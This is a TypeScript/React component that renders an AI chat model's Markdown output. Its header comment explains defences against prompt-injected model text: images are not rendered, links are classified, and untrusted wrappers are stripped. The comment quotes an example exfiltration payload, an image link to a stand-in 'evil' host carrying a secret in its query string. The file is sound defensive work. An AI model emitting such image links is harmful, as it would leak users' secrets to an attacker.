"use client";

import Link from "next/link";
import { useTranslations } from "next-intl";
import type { ComponentPropsWithoutRef, ReactNode } from "react";
import Markdown, { type Components } from "react-markdown";
import rehypeSanitize, { defaultSchema } from "rehype-sanitize";
import remarkGfm from "remark-gfm";
import { CodeBlock } from "@/components/markdown-code-block";
import { classifyLink } from "@/lib/ai/chat-links";
import { plainText } from "@/lib/ai/untrusted-text";
import { cn } from "@/lib/utils";

/**
 * The chat variant of the Markdown renderer (frontend.md §5.5; synthesis §4.10). Model text can be
 * steered by prompt-injected content, so on top of the KB renderer's sanitize-first pipeline
 * (SEC-003 / ADR-0029 — `rehype-sanitize` runs FIRST, no raw HTML, no `dangerouslySetInnerHTML`):
 *   - NO images: an image renders as its alt text, and nothing is ever fetched — a prompt-injected
 *     `![](https://evil/?q=<secret>)` is a known exfiltration channel;
 *   - no mermaid, no wiki-links, no secret chips, no attachment images (a fenced block is only code);
 *   - links go through `classifyLink`: in-app paths use the router, explicit external links open in a
 *     new tab without opener or referrer and show their host, bare URLs are never auto-linked;
 *   - `<untrusted_content>` wrappers are removed before parsing (the text inside stays plain text).
 */

function ChatImage({ alt }: { alt?: string }) {
  const t = useTranslations("ai.markdown");
  const text = typeof alt === "string" ? alt.trim() : "";
  return (
    <span className="text-muted-foreground">
      {text ? t("imageRemoved", { alt: text }) : t("imageRemovedNoAlt")}
    </span>
  );
}

function textOf(children: ReactNode): string {
  if (typeof children === "string" || typeof children === "number") return String(children);
  if (Array.isArray(children)) return children.map(textOf).join("");
  return "";
}

function ChatLinkView({ href, children }: { href?: string; children?: ReactNode }) {
  const t = useTranslations("ai.markdown");
  const link = classifyLink(href, textOf(children));
  if (link.kind === "internal") {
    return (
      <Link href={link.href} className="font-medium text-primary underline underline-offset-2">
        {children}
      </Link>
    );
  }
  if (link.kind === "external") {
    return (
      <>
        <a
          href={link.href}
          target="_blank"
          rel="noopener noreferrer nofollow"
          referrerPolicy="no-referrer"
          className="font-medium text-primary underline underline-offset-2"
        >
          {children}
          <span className="sr-only"> ({t("externalLink", { host: link.host })})</span>
        </a>{" "}
        <span className="font-mono text-xs text-muted-foreground">({link.host})</span>
      </>
    );
  }
  return <span>{children}</span>;
}

const COMPONENTS: Components = {
  code({ node, className, children, ...rest }) {
    void node;
    const match = /language-(\w+)/.exec(className ?? "");
    const text = String(children ?? "");
    if (!match && !text.includes("\n")) {
      return (
        <code className={className} {...rest}>
          {children}
        </code>
      );
    }
    return <CodeBlock language={match?.[1] ?? ""} value={text.replace(/\n$/, "")} />;
  },
  pre({ children }: ComponentPropsWithoutRef<"pre">) {
    return <>{children}</>;
  },
  a({ node, href, children }) {
    void node;
    return <ChatLinkView href={href}>{children}</ChatLinkView>;
  },
  img({ node, alt }) {
    void node;
    return <ChatImage alt={alt} />;
  },
  table({ node, ...props }) {
    void node;
    return (
      <div className="my-2 max-w-full overflow-x-auto">
        <table {...props} />
      </div>
    );
  },
};

export function AiMarkdown({ content, className }: { content: string; className?: string }) {
  return (
    <div
      className={cn(
        "prose prose-sm max-w-none text-pretty dark:prose-invert",
        "prose-p:my-1.5 prose-ul:my-1.5 prose-ol:my-1.5 prose-li:my-0.5 prose-headings:mt-3 prose-headings:mb-1.5",
        "prose-code:rounded prose-code:border prose-code:border-border/60 prose-code:bg-muted prose-code:px-1 prose-code:py-0.5 prose-code:font-mono prose-code:text-[0.85em] prose-code:font-normal prose-code:before:content-none prose-code:after:content-none",
        className,
      )}
    >
      <Markdown
        remarkPlugins={[remarkGfm]}
        rehypePlugins={[[rehypeSanitize, defaultSchema]]}
        components={COMPONENTS}
      >
        {plainText(content)}
      </Markdown>
    </div>
  );
}
